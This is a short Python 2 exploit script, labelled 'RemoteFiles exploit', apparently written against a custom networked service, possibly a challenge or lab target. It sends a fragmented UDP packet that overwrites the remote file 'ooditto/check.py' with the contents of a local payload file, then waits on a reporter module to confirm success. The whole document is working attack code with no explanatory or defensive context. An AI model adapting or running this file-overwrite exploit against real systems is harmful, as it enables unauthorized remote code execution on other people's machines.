#!/usr/bin/python
from netfw import *
from socket import *
from struct import pack
from reporter import *
import sys

def exploit(ip, port):
	reporter = reporter_init()

	# Create a connection to requested destination
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect((ip, port))

	# Read the payload
	with open("payload.py", "rb") as f: payload = f.read()

	# Path to override
	path = "ooditto/check.py"

	# Create the malicious packet
	pkt = ProtocolHandleUpper(path, payload)

	#print pkt.serialize()

	# Fragment the packets and send
	FragmentedPacket(pkt).send(s)

	return reporter_wait(reporter)

if __name__ == "__main__":
	if (len(sys.argv) != 3):
		print "RemoteFiles exploit"
		print "Usage: %s <ip> <Wrapper RECV port>" % (sys.argv[0])
		exit(0)

	s = exploit(sys.argv[1], int(sys.argv[2]))

	if s == "" or s == "main":
		print "Exploit success"
	else:
		print "Reported function: %s" % (s)
